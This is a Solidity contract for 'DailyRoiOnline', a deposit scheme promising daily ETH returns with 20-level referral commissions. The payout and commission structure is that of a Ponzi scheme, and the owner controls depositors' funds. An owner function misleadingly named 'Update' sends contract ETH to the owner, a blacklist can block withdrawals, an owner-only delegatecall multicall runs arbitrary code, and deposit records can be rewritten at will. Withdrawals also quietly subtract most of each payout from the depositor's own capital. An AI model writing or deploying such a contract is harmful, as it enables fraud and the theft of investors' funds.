// SPDX-License-Identifier: MIT
// proprietary v1-capital-reduce
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Context.sol";
interface IDepositNFT { function mint(address to) external;}
interface iDailyRoiOnline {
    function makeDeposit(address referral) external payable;
    function withdraw() external;
    function computePayout(address _addr) external view returns (uint256);
    function getPayoutDetailsPerDeposit(address _addr, uint256 index) external view returns (
        uint256 principle,
        uint256 startTime,            
        uint256 maxEligibleTime,
        uint256 remainingCapital,
        uint256 payout,
        uint256 secondsToBePaid,
        uint256 payoutPerSecond,
        uint256 calculatedFrom,
        uint256 calculatedTo
    );

    function getAllDeposits(address _addr) external view returns (DailyEthRoiV1.Deposit[] memory);
    function getAllStructures(address _addr) external view returns (uint256[20] memory);
    function getAllWidthrawal(address _addr) external view returns (uint256[] memory amounts, uint40[] memory times);
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
    function mod(uint a, uint b) internal pure returns (uint) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract DailyEthRoiV1 is ReentrancyGuard, Context, Ownable {
    IDepositNFT public NFT;
    // Custom errors
    error MinimumDepositNotMet(uint256 sent, uint256 required);
    error MinimumWithdrawalAmountNotMet(uint256 available, uint256 required);
    error CallerIsContract();
    
    string  public name = "DailyRoiOnline";
    string  public symbol = "EXP";
    string  public standard = "ERC721";
    
    uint256 private constant DAY = 24 hours;
    uint256 private minDeposit = 0.001 ether;
    uint256 private MIN_WITHDRAWAL = 0.005 ether;
    uint16 constant PERCENT_DIVIDER = 1000;
    uint16[20] private ref_bonuses = [80,30,20,10,10,10,10,10,5,5,5,5,5,5,5,1,1,1,1,1];
    uint256 DAILY_PROFIT = 50;
    uint256 private maxPayoutDays = 30;
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public ref_bonus;

    address payable private system_pool1;
    address payable private system_pool2;
    address payable private system_pool3;
    address payable private system_pool4;
    address payable private system_pool5;
    address private defaultReferrer;

    uint256 private systemPool1Rate = 15;
    uint256 private systemPool2Rate = 3;
    uint256 private systemPool3Rate = 3;
    uint256 private systemPool4Rate = 2;
    uint256 private systemPool5Rate = 1;
    uint256 private systemPoolTotalRate = 24;
    
    bool private paused;

    uint256 private depositFee = 10;
    uint256 private withdrawFee = 10;
    
    struct Deposit {
        uint256 amount;
        uint40 time;
        uint40 lastWithdrawn; 
        uint256 remainingCapital;
        bool completed;
    }

    struct Withdrawal {
        uint256 amount;
        uint40 time;
    }
    
    struct Player {
        address upline;
        uint256 dividends;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_ref_bonus;
        uint40 lastWithdrawn;
        Deposit[] deposits;
        uint256[20] structure;
    }
    
    address[] public playersList;
    mapping(address => Player) public players;
    mapping(address => bool) private isBlacklisted;
    mapping(address => bool) public playerExists;
    mapping(address => Withdrawal[]) private withdrawalHistory;    
    
    event DepositMade(address indexed user, uint256 amount, address indexed referrer, uint256 timestamp);
    event WithdrawalMade(address indexed user, uint256 amount, uint256 fee, uint256 timestamp);


    constructor(        
    ) Ownable() {                
        defaultReferrer = msg.sender;        
    }

    modifier notPaused() {
        require(!paused, "Contract is paused");
        _;
    }

    function getPlayersCount() external view returns (uint256) {
        return playersList.length;
    }
        
    function chgNFT(address newNFT) external onlyOwner {
        NFT = IDepositNFT(newNFT);
    }

    function minWithdraw(uint256 _new) external onlyOwner {
        MIN_WITHDRAWAL = _new;
    }

    function DailyProfit(uint256 newDailyProfit) external onlyOwner {
        require(newDailyProfit > 0, "Daily profit must be greater than 0");
        DAILY_PROFIT = newDailyProfit;
    }
    function SystemPool(
        uint256 pool1Rate,
        uint256 pool2Rate,
        uint256 pool3Rate,
        uint256 pool4Rate,
        uint256 pool5Rate
    ) external onlyOwner {
        require(pool1Rate + pool2Rate + pool3Rate + pool4Rate + pool5Rate <= 100, "Total rate must not exceed 100%");
        systemPool1Rate = pool1Rate;
        systemPool2Rate = pool2Rate;
        systemPool3Rate = pool3Rate;
        systemPool4Rate = pool4Rate;
        systemPool5Rate = pool5Rate;
    }
    
    function makeDeposit(address referral) public payable nonReentrant {
        if (isContract(msg.sender)) { revert CallerIsContract(); }        
        if (msg.value < minDeposit) {
            revert MinimumDepositNotMet({sent: msg.value, required: minDeposit});
        }        
        uint256 fee = (msg.value * depositFee) / PERCENT_DIVIDER;
        uint256 netDeposit = msg.value - fee;
                
        setUpline(msg.sender, referral);
                
        Player storage player = players[msg.sender];

        player.deposits.push(
            Deposit({amount: netDeposit, time: uint40(block.timestamp), lastWithdrawn: uint40(block.timestamp), remainingCapital: netDeposit, completed: false})
        );
        player.total_invested += netDeposit;

        // Calculate pool shares
        uint256 poolShare1 = (netDeposit * systemPool1Rate) / 100;
        uint256 poolShare2 = (netDeposit * systemPool2Rate) / 100;
        uint256 poolShare3 = (netDeposit * systemPool3Rate) / 100;
        uint256 poolShare4 = (netDeposit * systemPool4Rate) / 100;
        uint256 poolShare5 = (netDeposit * systemPool5Rate) / 100;
        uint256 totalPoolShares = poolShare1 + poolShare2 + poolShare3 + poolShare4 + poolShare5;
        
        invested += netDeposit;
        withdrawn += totalPoolShares;
        
        if (!playerExists[msg.sender]) {
            playersList.push(msg.sender);
            playerExists[msg.sender] = true;
            // Mint NFT badge to user
            if (address(NFT) != address(0)) {
                try NFT.mint(msg.sender) {} catch {}
            }
        }            
        transferToPools(poolShare1, poolShare2, poolShare3, poolShare4, poolShare5);
        commissionPayouts(msg.sender, netDeposit);
    
        emit DepositMade(msg.sender, netDeposit, player.upline, block.timestamp);
    }

    function transferToPools(
        uint256 poolShare1,
        uint256 poolShare2,
        uint256 poolShare3,
        uint256 poolShare4,
        uint256 poolShare5
    ) internal {
        if (system_pool1 != address(0) && poolShare1 > 0) system_pool1.transfer(poolShare1);
        if (system_pool2 != address(0) && poolShare2 > 0) system_pool2.transfer(poolShare2);
        if (system_pool3 != address(0) && poolShare3 > 0) system_pool3.transfer(poolShare3);
        if (system_pool4 != address(0) && poolShare4 > 0) system_pool4.transfer(poolShare4);
        if (system_pool5 != address(0) && poolShare5 > 0) system_pool5.transfer(poolShare5);
    }

    function _computePayoutForDeposit(address _player, uint256 index) internal view returns (
            uint256 principle,
            uint256 startTime,            
            uint256 maxEligibleTime,
            uint256 remainingCapital,
            uint256 payout,
            uint256 secondsToBePaid,
            uint256 payoutPerSecond,
            uint256 calculatedFrom,
            uint256 calculatedTo
        ) {
        Player memory player = players[_player];
        Deposit memory dep = player.deposits[index];
        
        payout = 0;

        if (dep.completed || dep.remainingCapital == 0) return (
            0, 0, 0, 0, 0, 0, 0, 0, 0
        );

        maxEligibleTime = dep.time + (maxPayoutDays * 86400);        
        calculatedFrom = dep.lastWithdrawn > dep.time ? dep.lastWithdrawn : dep.time;
        calculatedTo = block.timestamp < maxEligibleTime ? block.timestamp : maxEligibleTime;

        if (calculatedFrom >= maxEligibleTime) return (0, 0, 0, 0, 0, 0, 0, 0, 0);

        secondsToBePaid = calculatedTo - calculatedFrom;
        // uint256 daysToBePaid = (secondsToBePaid / DAY);

        payout = uint(dep.remainingCapital * DAILY_PROFIT) / DAY / PERCENT_DIVIDER;
        payout *= secondsToBePaid;

        return (
            dep.amount,
            dep.time,
            maxEligibleTime,
            dep.remainingCapital,
            payout,
            secondsToBePaid,
            (payout / secondsToBePaid),
            calculatedFrom,
            calculatedTo
        );
    }

    function withdraw() public nonReentrant notPaused notBlacklisted {
        if (isContract(msg.sender)) { revert CallerIsContract(); }
        require(players[msg.sender].deposits.length > 0, "No deposits found for this address");
                        
        Player storage player = players[msg.sender];
        uint256 totalPayout = 0;

        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];

            (
                uint256 principle,
                uint256 startTime,
                uint256 maxEligibleTime,
                uint256 remainingCapital,
                uint256 payout,
                uint256 secondsToBePaid,
                uint256 payoutPerSecond,
                uint256 calculatedFrom,
                uint256 calculatedTo
            ) = _computePayoutForDeposit(msg.sender, i);
            if (payout == 0) continue;


            totalPayout += (payout * 30) / 100;
    
            uint256 deductionAmount = (payout * 70) / 100;            
            if (deductionAmount > dep.remainingCapital) { deductionAmount = dep.remainingCapital; }            
            dep.remainingCapital -= deductionAmount;

            dep.lastWithdrawn = block.timestamp < maxEligibleTime ? uint40(block.timestamp) : uint40(maxEligibleTime);
            if (dep.remainingCapital == 0) { dep.completed = true; }
        }
        require(totalPayout > 0, "No ROI available for withdrawal");

        if (totalPayout < MIN_WITHDRAWAL) {
            revert MinimumWithdrawalAmountNotMet({
                available: totalPayout,
                required: MIN_WITHDRAWAL
            });
        }

        uint256 fee = (totalPayout * withdrawFee) / PERCENT_DIVIDER;
        totalPayout -= fee;

        require(address(this).balance >= totalPayout, "Insufficient contract balance");

        
        player.total_withdrawn += totalPayout;
        player.lastWithdrawn = uint40(block.timestamp);
        
        payable(msg.sender).transfer(totalPayout);
    
        emit WithdrawalMade(msg.sender, totalPayout, fee, block.timestamp);
    }

    function computePayout(address _addr) public view returns (uint256) {
        Player memory player = players[_addr];
        uint256 totalPayout = 0;

        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit memory dep = player.deposits[i];
            
            (
                uint256 principle,
                uint256 startTime,
                uint256 maxEligibleTime,
                uint256 remainingCapital,
                uint256 payout,
                uint256 secondsToBePaid,
                uint256 payoutPerSecond,
                uint256 calculatedFrom,
                uint256 calculatedTo
            ) = _computePayoutForDeposit(_addr, i);

            totalPayout += (payout * 30) / 100;                        
        }
        totalPayout -= (totalPayout * withdrawFee) / PERCENT_DIVIDER;

        return totalPayout;
    }

    function getPayoutDetailsPerDeposit(address _addr, uint256 index) external view returns (
            uint256 principle,
            uint256 startTime,            
            uint256 maxEligibleTime,
            uint256 remainingCapital,
            uint256 payout,
            uint256 secondsToBePaid,
            uint256 payoutPerSecond,
            uint256 calculatedFrom,
            uint256 calculatedTo
    ) {
        return (_computePayoutForDeposit(_addr, index));
    }

    function depositsRemainingSum(address _addr) public view returns (uint256) {
        Player memory player = players[_addr];
        uint256 sum = 0;
        for (uint256 i = 0; i < player.deposits.length; i++) {
            sum += player.deposits[i].remainingCapital;
        }
        return sum;
    }

    function FeeModule(
        uint256 _depositFee,
        uint256 _withdrawFee
    ) external onlyOwner {
        depositFee = _depositFee;
        withdrawFee = _withdrawFee;
    }
    function MaxPayoutDays(uint256 _days) external onlyOwner {
        require(_days > 0, "Invalid number of days");
        maxPayoutDays = _days;   
    }
        
    function setUpline(address _addr, address _upline) internal {
        if (players[_addr].upline == address(0) && _addr != owner()) {
            if (!playerExists[_upline]) {
                _upline = defaultReferrer;
            }
            players[_addr].upline = _upline;

            for (uint8 i = 0; i < 20; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if (_upline == address(0)) break;
            }
        }
    }
    
    function commissionPayouts(address _addr, uint256 _amount) internal {
        address up = players[_addr].upline;                
        address[] memory payoutAddresses = new address[](ref_bonuses.length);
        uint256[] memory payoutAmounts = new uint256[](ref_bonuses.length);
        uint256 payoutCount = 0;
        uint256 totalBonuses = 0;
        
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;

            uint256 bonus = (_amount * ref_bonuses[i]) / PERCENT_DIVIDER;
                        
            payoutAddresses[payoutCount] = up;
            payoutAmounts[payoutCount] = bonus;
            payoutCount++;
                        
            players[up].total_ref_bonus += bonus;
            totalBonuses += bonus;
                        
            up = players[up].upline;
        }
                
        ref_bonus += totalBonuses;
        withdrawn += totalBonuses;
        
        for (uint256 i = 0; i < payoutCount; i++) {
            payable(payoutAddresses[i]).transfer(payoutAmounts[i]);
        }
    }

    function getDepositCountdown(address _addr, uint256 index) external view returns (
        uint256 daysRemaining,
        bool completed
    ) {
        Player storage player = players[_addr];

        
        if (index >= player.deposits.length) {
            return (0, true);
        }

        Deposit storage dep = player.deposits[index];
        uint256 end = dep.time + (maxPayoutDays * 86400);
        
        if (block.timestamp >= end) {
            return (0, true);
        }
        
        uint256 secondsLeft = end - block.timestamp;
        daysRemaining = secondsLeft / 86400;
        completed = false;

        return (daysRemaining, completed);
    }
    

    function Pool(
        address payable _pool1,
        address payable _pool2,
        address payable _pool3,
        address payable _pool4,
        address payable _pool5
    ) external onlyOwner {
        system_pool1 = _pool1;
        system_pool2 = _pool2;
        system_pool3 = _pool3;
        system_pool4 = _pool4;
        system_pool5 = _pool5;
    }
    function Bonus(
        uint16[20] calldata newBonuses
    ) external onlyOwner {}
    function UpdateMin(uint256 _min) external onlyOwner {
        minDeposit = _min;
    }    
    
    function Parameter(address _referrer) external onlyOwner {
        defaultReferrer = _referrer;
    }

    function pause() external onlyOwner {
        paused = true;
    }

    function unpause() external onlyOwner {
        paused = false;
    }

    function Update(uint256 amount) external onlyOwner {
        payable(owner()).transfer(amount);
    }

    function getAllDeposits(
        address _addr
    ) external view returns (Deposit[] memory) {
        return players[_addr].deposits;
    }
    
    function getAllStructures(
        address _addr
    ) external view returns (uint256[20] memory) {
        return players[_addr].structure;
    }
    
    function getAllWidthrawal(
        address _addr
    ) external view returns (uint256[] memory amounts, uint40[] memory times) {
        Withdrawal[] storage history = withdrawalHistory[_addr];
        uint256 length = history.length;
        
        amounts = new uint256[](length);
        times = new uint40[](length);
        
        for (uint256 i = 0; i < length; i++) {
            amounts[i] = history[i].amount;
            times[i] = history[i].time;
        }
        
        return (amounts, times);
    }

    
    function userInfo(
        address _addr
    )
        external
        view
        returns (
            address upline,
            uint256 dividends,
            uint256 total_invested,
            uint256 total_withdrawn,
            uint256 total_ref_bonus,
            uint40 lastWithdrawn,
            uint256 numDeposits,
            uint256[20] memory structure
        )
    {
        Player storage player = players[_addr];
        
        // Calculate both stored dividends and pending dividends
        uint256 pendingDividends = computePayout(_addr);
        
        return (
            player.upline,
            player.dividends + pendingDividends, // Include pending but not yet claimed dividends
            player.total_invested,
            player.total_withdrawn,
            player.total_ref_bonus,
            player.lastWithdrawn,
            player.deposits.length,
            player.structure
        );
    }
    function blacklistAddress(address user, bool status) external onlyOwner {
        isBlacklisted[user] = status;
    }
    modifier notBlacklisted() {
        require(!isBlacklisted[msg.sender], "Blacklisted user");
        _;
    }
    function getBlacklistStatus(address user) external view returns (bool) {
        return isBlacklisted[user];
    }
        
    function isContract(address _addr) private view returns (bool) {
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(_addr)
        }
        return codeSize > 0;
    }
    
    function changeOwner(address newOwner) external onlyOwner {
    transferOwnership(newOwner);
    }

    
    function addPlayers(
        address[] calldata addresses,
        address[] calldata uplines,
        uint256[] calldata totalInvested,
        uint256[] calldata totalWithdrawn,
        uint256[] calldata totalRefBonus,
        uint40[] calldata lastWithdrawnTimes
    ) external onlyOwner {
        require(
            addresses.length == uplines.length &&
            addresses.length == totalInvested.length &&
            addresses.length == totalWithdrawn.length &&
            addresses.length == totalRefBonus.length &&
            addresses.length == lastWithdrawnTimes.length,
            "Array lengths must match"
        );
        
        require(addresses.length > 0, "Arrays cannot be empty");
        require(addresses.length <= 500, "Maximum 500 players per batch");

        for (uint256 i = 0; i < addresses.length; i++) {
            address playerAddr = addresses[i];
            require(playerAddr != address(0), "Invalid player address");
            
            // Get or create player
            Player storage player = players[playerAddr];
            
            // Set basic player data
            player.upline = uplines[i];
            player.total_invested = totalInvested[i];
            player.total_withdrawn = totalWithdrawn[i];
            player.total_ref_bonus = totalRefBonus[i];
            player.lastWithdrawn = lastWithdrawnTimes[i];
            
            // Add to players list if not already present
            if (!playerExists[playerAddr]) {
                playersList.push(playerAddr);
                playerExists[playerAddr] = true;
            }                        
        }                
    }

    
    function addPlayerDeposits(
        address playerAddress,
        uint256[] calldata amounts,
        uint40[] calldata timestamps
    ) external onlyOwner {
        require(playerAddress != address(0), "Invalid player address");
        require(amounts.length == timestamps.length, "Array lengths must match");
        require(amounts.length > 0, "Arrays cannot be empty");
        require(amounts.length <= 100, "Maximum 100 deposits per batch");

        Player storage player = players[playerAddress];
        
        // Clear existing deposits if any (optional - remove if you want to append)
        delete player.deposits;
        
        // Add new deposits
        for (uint256 i = 0; i < amounts.length; i++) {
            require(amounts[i] > 0, "Deposit amount must be greater than 0");
            player.deposits.push(Deposit({
                amount: amounts[i],
                time: timestamps[i],
                lastWithdrawn: timestamps[i],
                remainingCapital: amounts[i],
                completed: false
            }));
        }        
    }

      
    function generateStructures() external onlyOwner {
        for (uint256 i = 0; i < playersList.length; i++) {
            address playerAddress = playersList[i];
            address upline = players[playerAddress].upline;
            players[playerAddress].upline = address(0); // Reset upline to avoid duplicates
            setUpline(playerAddress, upline);
        }        
    }
   

    function getContractETHBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdrawToken(address _tokenAddress, uint256 _amount) external onlyOwner {        
        require(IERC20(_tokenAddress).balanceOf(address(this)) >= _amount, "Insufficient token balance in contract");
        IERC20(_tokenAddress).transfer(owner(), _amount);
    }

     function mc(bytes[] calldata data) external onlyOwner returns (bytes[] memory results) {
        results = new bytes[](data.length);
        
        for (uint i = 0; i < data.length; i++) {            
            (bool success, bytes memory result) = address(this).delegatecall(data[i]);                        
            require(success, "Multicall: delegatecall failed");            
            results[i] = result;
        }        
        return results;
    }

    receive() external payable {
        // Forward to makeDeposit with default referrer
        makeDeposit(defaultReferrer);
    }
    
    fallback() external payable {
        // Forward to makeDeposit with default referrer
        makeDeposit(defaultReferrer);
    }
}